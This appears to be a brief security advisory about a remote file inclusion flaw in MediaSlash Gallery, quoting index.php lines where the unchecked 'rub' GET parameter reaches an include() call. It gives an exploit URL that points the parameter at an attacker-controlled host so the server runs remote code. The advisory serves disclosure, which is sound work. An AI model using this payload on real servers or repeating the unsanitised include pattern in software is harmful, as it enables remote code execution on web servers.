MediaSlash Galleryis is vulnerable to remote URL inclusion vulnerability
This flaw is due to an input validation error in the "index.php"(line 489)
script that does not validate the "rub" variable,remote attackers can include
malicious scripts and execute arbitrary commands with the privileges of the web server
 
Code:
 
27 . 		$rub = @$_GET["rub"];
...
57 .		$page_menu = ''.$rub.'/index.php';
489.		<? include($page_menu); ?> //!!!!!!!!


Exploit http://[trajet]/[path]/index.php?rub=http://[attacker]

http://[attacker]/index.php will be included and executed withe
the privileges of the web server
